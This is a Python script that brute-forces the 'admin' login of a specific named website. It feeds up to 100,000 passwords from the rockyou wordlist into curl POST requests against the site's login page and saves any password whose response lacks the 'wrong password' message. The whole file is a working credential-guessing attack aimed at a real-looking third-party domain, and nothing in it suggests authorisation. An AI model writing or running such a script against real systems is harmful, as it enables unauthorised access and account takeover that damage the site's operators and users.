import subprocess, sys, os

count = 0
with open("/tmp/rockyou.txt", "r", encoding="latin-1", errors="ignore") as f:
    for line in f:
        pw = line.strip()
        if not pw: continue
        count += 1
        if count > 100000: break
        if count % 500 == 0:
            print(f"Progress: {count}/100000", flush=True)
        try:
            r = subprocess.run(["curl","-s","--max-time","3",
                "http://bjhzsv.com/main/a7chkuser.asp",
                "-d","t1=admin&t2="+pw+"&t3=0000"],
                capture_output=True, timeout=5)
            raw = r.stdout
            decoded = raw.decode("gb2312")
            if "\u5bc6\u7801\u9519\u8bef" not in decoded:
                with open("/tmp/admin_password_found.txt","w") as f2:
                    f2.write("FOUND PASSWORD: "+pw+"\n")
                    f2.write(decoded[:500]+"\n")
                print("*** FOUND: "+pw+" ***", flush=True)
                sys.exit(0)
        except: pass

with open("/tmp/admin_password_status.txt","w") as f2:
    f2.write(f"Done trying {count} passwords\n")
print("Done, no match", flush=True)
